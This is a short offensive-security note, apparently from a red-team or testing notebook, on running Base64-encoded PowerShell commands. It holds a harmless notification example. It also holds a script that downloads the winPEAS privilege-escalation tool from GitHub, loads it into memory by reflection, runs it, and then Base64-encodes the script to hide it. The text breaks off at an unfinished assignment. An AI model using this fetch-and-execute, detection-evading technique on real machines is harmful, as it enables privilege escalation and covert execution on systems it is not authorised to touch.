# Base-64 Encoded Powershell commands

Danger Status: Medium
Issue Exists?: Yes
Not Malware Scope?: No
Tested?: Yes

$MyScript = @'
$Title = "Hey buddy"
$Message = "I am a notification running in an encoded command"
$Type = "info"

[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
'@

$MyScript = @'
$url = "[https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe)"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
pause
'@
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))

$MyEncodedScript =